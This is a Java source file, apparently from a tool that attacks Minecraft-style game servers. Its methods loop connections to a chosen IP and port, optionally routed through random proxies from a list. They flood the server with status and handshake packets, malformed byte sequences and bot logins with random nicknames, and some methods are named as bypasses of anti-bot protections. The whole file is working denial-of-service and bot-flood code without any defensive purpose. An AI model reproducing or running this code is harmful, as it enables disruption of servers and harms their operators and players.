package ir.s4eed_hd.pz.managers;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.Proxy.Type;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

import org.apache.commons.lang3.RandomStringUtils;

import ir.s4eed_hd.pz.ProxyType;

public class Methods {
	
	private static Methods mm;
	private Methods() {}
	public static Methods getManager(){
		if(mm == null)
			mm = new Methods();
		return mm;
	}
    HashMap<String, Object> data = new HashMap<String, Object>();
	
	
	public void setData(HashMap<String, Object> dataobj){
		data = dataobj;
	}
	
	public Proxy getRandomProxy(){
		List<String[]> proxies = new ArrayList<String[]>();
		ProxyType type = (ProxyType) data.get("ProxyType");
		Random rand = new Random();
		try {
			File f = new File((String)data.get("ProxyFile"));
			Scanner scanner = new Scanner(f);
			while (scanner.hasNextLine()) {
				String line = scanner.nextLine();
				if (line.isEmpty() || line.startsWith("##") || !line.contains(":")) continue;
	            String[] pro= line.split(":");
	            proxies.add(pro);
				}
			if ( type == ProxyType.HTTP ){
				String[] str = proxies.get(rand.nextInt(proxies.size()));
				Proxy prox = new Proxy(Type.HTTP, new InetSocketAddress(str[0], Integer.parseInt(str[1])));
				return prox;
			}
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
			}
		return null;
	}
	
	public void ping(){
		Socket sock = null;
		ProxyType type = (ProxyType) data.get("ProxyType");
		for ( int i = 0 ; i <= (int)data.get("Loop") ; i++ ){
		try {
			if ( type == ProxyType.HTTP ){
				sock = new Socket(getRandomProxy());
			}
			if ( type == ProxyType.DIRECT ){
				sock = new Socket();
			}
			sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
			DataOutputStream out = new DataOutputStream(sock.getOutputStream());
			byte[] status =  PacketUtils.createStatusPacket((String)data.get("IP"), (int)data.get("Port"), (int)data.get("Protocol"));
			byte[] info = new byte[] {0};
			byte[] info2 = new byte[] {1};
			out.write(status.length);
			out.write(status);
			out.write(info.length);
			out.write(info);
			out.write(info2.length);
			out.write(info2);
			try {
				Thread.sleep(300L);
			} catch (InterruptedException e) {
				e.printStackTrace();
			} 
		}  catch (IOException e){
			
		}
		}
	}
	
	public void join(){
		ProxyType type = (ProxyType) data.get("ProxyType");
		Socket sock = null;
		for ( int i = 0 ; i <= (int)data.get("Loop") ; i++ ){
			try {
				if ( type == ProxyType.HTTP ){
					sock = new Socket(getRandomProxy());
				}
				if ( type == ProxyType.DIRECT ){
					sock = new Socket();
				}
				sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
				DataOutputStream out = new DataOutputStream(sock.getOutputStream());
				PacketUtils.writePacket(out,  PacketUtils.createHandshakePacket((String)data.get("IP"), (int)data.get("Port"), (int)data.get("Protocol")));
				String nick_generated = RandomStringUtils.random((int)data.get("NickSize"), true, true);
				String nick_prefix = (String)data.get("BotPrefix") + nick_generated;
				String nick = nick_prefix + (String)data.get("BotSuffix");
				PacketUtils.writePacket(out, PacketUtils.createLogin(nick));
				//out.write(handshake.length);
				//out.write(handshake);
				//out.write(nick.length() + 2);
				//out.write(login);
				sock.setKeepAlive(true);
				try {
					Thread.sleep(1000L);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
				}
				
			} catch (IOException e) {
				// TODO Auto-generated catch block
			}
		}
	}
	
	public void a2lsBypass(){
		ProxyType type = (ProxyType) data.get("ProxyType");
		Socket sock = null;
		for ( int i = 0 ; i <= (int)data.get("Loop") ; i++ ){
		try {
			if ( type == ProxyType.HTTP ){
				sock = new Socket(getRandomProxy());
			}
			if ( type == ProxyType.DIRECT ){
				sock = new Socket();
			}
			sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
			DataOutputStream out = new DataOutputStream(sock.getOutputStream());
			byte[] handshake = PacketUtils.createHandshakePacket((String)data.get("IP"), (int)data.get("Port"), (int)data.get("Protocol"));
			String nick_generated = RandomStringUtils.random((int)data.get("NickSize"), true, true);
			String nick_prefix = (String)data.get("BotPrefix") + nick_generated;
			String nick = nick_prefix + (String)data.get("BotSuffix");
			byte[] login = PacketUtils.createLogin(nick);
			byte[] status =  PacketUtils.createStatusPacket((String)data.get("IP"), (int)data.get("Port"), (int)data.get("Protocol"));
			byte[] info = new byte[] {0};
			byte[] info2 = new byte[] {1};
			out.write(status.length);
			out.write(status);
			out.write(info.length);
			out.write(info);
			out.write(info2.length);
			out.write(info2);
			try {
				Thread.sleep(200L, 3);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
			}
			out.write(handshake.length);
			out.write(handshake);
			out.write(nick.length() + 2);
			out.write(login);
			sock.setKeepAlive(true);
			try {
				Thread.sleep(5000L, 3);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
		}
	}
	}
	
	public void ERR0R(){
		ProxyType type = (ProxyType) data.get("ProxyType");
		Socket sock = null;
		for ( int i = 0 ; i <= (int)data.get("Loop") ; i++ ){
		try {
			if ( type == ProxyType.HTTP ){
				sock = new Socket(getRandomProxy());
			}
			if ( type == ProxyType.DIRECT ){
				sock = new Socket();
			}
			sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
			DataOutputStream out = new DataOutputStream(sock.getOutputStream());
			PacketUtils.writePacket(out, PacketUtils.createHandshakePacket((String)data.get("IP"), (int)data.get("Port"), (int)data.get("Protocol")));
			byte[] bytes = new byte[] {0,17,19,21,0,-15,-17,-19,-21,1,1,0,1,0,1,0,0,0,0,0,0};
			PacketUtils.writePacket(out, bytes);
			try {
				Thread.sleep(1000L);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} catch( IOException e ){
			
		}
		}
	}
	
	public void someUUID(){
		ProxyType type = (ProxyType) data.get("ProxyType");
		Socket sock = null;
		for ( int i = 0 ; i <= (int)data.get("Loop") ; i++ ){
		try {
			if ( type == ProxyType.HTTP ){
				sock = new Socket(getRandomProxy());
			}
			if ( type == ProxyType.DIRECT ){
				sock = new Socket();
			}
			sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
			DataOutputStream out = new DataOutputStream(sock.getOutputStream());
			PacketUtils.writePacket(out, PacketUtils.createHandshakePacket((String)data.get("IP"), (int)data.get("Port"), (int)data.get("Protocol")));
			for(int v = 0; v < 260; ++v) {
	            out.write(3);
	            out.write(0);
	            out.write(1);
	            for ( int j =1; j < 250; ++j ){
	            	out.write(j);
	            }
	         }

		} catch( IOException e ){
			
		}
		}
	}
	
	public void pz_fucker(){
		ProxyType type = (ProxyType) data.get("ProxyType");
		Socket sock = null;
		for ( int i = 0 ; i <= (int)data.get("Loop") ; i++ ){
		try {
			if ( type == ProxyType.HTTP ){
				sock = new Socket(getRandomProxy());
			}
			if ( type == ProxyType.DIRECT ){
				sock = new Socket();
			}
			sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
			DataOutputStream out = new DataOutputStream(sock.getOutputStream());
			String str = RandomStringUtils.random((int)3, true, true);
			PacketUtils.writePacket(out, PacketUtils.createHandshakePacket((String)data.get("IP"), (int)data.get("Port"), (int)data.get("Protocol")));
			PacketUtils.writePacket(out, PacketUtils.createPZFuckerLogin(str));
			for ( int x = 0 ; x < 1900 ; x++ ){
				out.write(2);
				out.write(0);
				out.write(0);
			}

			sock.setKeepAlive(true);
			try {
				Thread.sleep(600L);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} catch( IOException e ){
			
		}
		}
	}
	
	public void silentAttack(){
		ProxyType type = (ProxyType) data.get("ProxyType");
		Socket sock = null;
		for ( int i = 0 ; i <= (int)data.get("Loop") ; i++ ){
			try {
				if ( type == ProxyType.HTTP ){
					sock = new Socket(getRandomProxy());
				}
				if ( type == ProxyType.DIRECT ){
					sock = new Socket();
				}
				sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
				DataOutputStream out = new DataOutputStream(sock.getOutputStream());
				byte[] handshake2 = new byte[]{1 * 5, 2 * 5};
				out.write(handshake2);
				sock.setKeepAlive(true);
				try {
					Thread.sleep(300L);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
				}
			} catch(IOException e){
			}
		}
	}
	
	public void nAntibot(){
		ProxyType type = (ProxyType) data.get("ProxyType");
		Socket sock = null;
		for ( int i = 0 ; i <= (int)data.get("Loop") ; i++ ){
			try {
				if ( type == ProxyType.HTTP ){
					sock = new Socket(getRandomProxy());
				}
				if ( type == ProxyType.DIRECT ){
					sock = new Socket();
				}
				sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
				DataOutputStream out = new DataOutputStream(sock.getOutputStream());
				String nick_generated = RandomStringUtils.random((int)data.get("NickSize"), true, true);
				String nick_prefix = (String)data.get("BotPrefix") + nick_generated;
				String nick = nick_prefix + (String)data.get("BotSuffix");
				PacketUtils.writePacket(out, PacketUtils.createHandshakePacket((String)data.get("IP"), (int)data.get("Port"), (int)data.get("Protocol")));
				PacketUtils.writePacket(out, PacketUtils.createLogin(nick));
				for(int i1 = 0; i1 < 1900; ++i1) {
		            out.write(1);
		            out.write(0);
		         }
				try {
					Thread.sleep(500L);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
			}
		}
	}
	
	public void emptyPacket(){
			ProxyType type = (ProxyType) data.get("ProxyType");
			Socket sock = null;
			for ( int i = 0 ; i <= (int)data.get("Loop") ; i++ ){
				try {
					if ( type == ProxyType.HTTP ){
						sock = new Socket(getRandomProxy());
					}
					if ( type == ProxyType.DIRECT ){
						sock = new Socket();
					}
					sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
					DataOutputStream out = new DataOutputStream(sock.getOutputStream());
					byte[] handshake2 = new byte[]{0 * 3};
					out.write(handshake2);
					sock.setKeepAlive(true);
					try {
						Thread.sleep(3000L);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
					}
				} catch (IOException e) {
					// TODO Auto-generated catch block
				}
	}
	}
	
}
